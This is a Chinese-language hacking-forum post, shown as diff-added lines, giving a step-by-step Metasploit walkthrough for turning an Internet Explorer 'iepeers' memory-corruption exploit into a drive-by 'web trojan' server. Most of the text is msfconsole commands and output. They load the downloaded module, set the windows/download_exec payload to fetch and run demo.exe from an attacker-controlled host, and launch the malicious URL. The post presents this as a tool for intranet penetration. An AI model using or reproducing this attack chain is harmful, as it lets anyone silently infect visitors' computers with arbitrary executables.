@@ -1,0 +1,49 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+网马0day用Metasploit生成方法
+D8888D主贴内容-------------------------------------------------------
+ 
+
+作者：LCX
+
+一、下载[url=http://www.rec-sec.com/exploits/msf/ie_iepeers_pointer.rb]链接标记http://www.rec-sec.com/exploits/msf/ie_iepeers_pointer.rb[/url]
+二、放到C:\Metasploit\Framework3\msf3\modules\exploits\test。我改个了名字叫ie.rb
+三、启动msfconsole
+四、msf > use exploit/test/ie
+      msf exploit(ie) > show optinos
+回显：
+Module options:
+   Name        Current Setting Required Description
+   ----        --------------- -------- -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on.
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+
+Exploit target:
+   Id Name
+   -- ----
+   0   Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0
+msf exploit(ie) > set srvhost 192.168.0.3
+srvhost => 192.168.0.3
+msf exploit(ie) > set srvport 8080
+srvport => 8080
+
+msf exploit(ie) > set payload windows/download_exec
+payload => windows/download_exec
+msf exploit(ie) > set url [url=http://192.168.0.3/demo.exe]链接标记http://192.168.0.3/demo.exe[/url]
+url => [url=http://192.168.0.3/demo.exe]链接标记http://192.168.0.3/demo.exe[/url]
+msf exploit(ie) > exploit
+
+Exploit running as background job.
+msf exploit(ie) > 
+
+Using URL: [url=http://192.168.0.3:8080/4rJ0JRSnX55wAY]链接标记http://192.168.0.3:8080/4rJ0JRSnX55wAY[/url]
+
+Server started.
+然后打开[url=http://192.168.0.3:8080/4rJ0JRSnX55wAY]链接标记http://192.168.0.3:8080/4rJ0JRSnX55wAY[/url]，你就可以看到源码了。
+红字是命令，其它的是回显
+
+内网渗透的时候会用到~
